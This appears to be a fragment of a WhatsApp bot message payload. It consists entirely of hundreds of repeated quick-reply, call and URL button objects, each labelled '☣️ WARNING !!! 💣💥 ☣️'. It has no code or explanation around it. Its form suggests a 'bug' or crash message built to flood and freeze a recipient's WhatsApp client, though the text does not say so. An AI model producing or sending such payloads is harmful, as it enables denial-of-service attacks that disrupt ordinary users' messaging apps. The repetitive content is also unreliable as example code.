{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
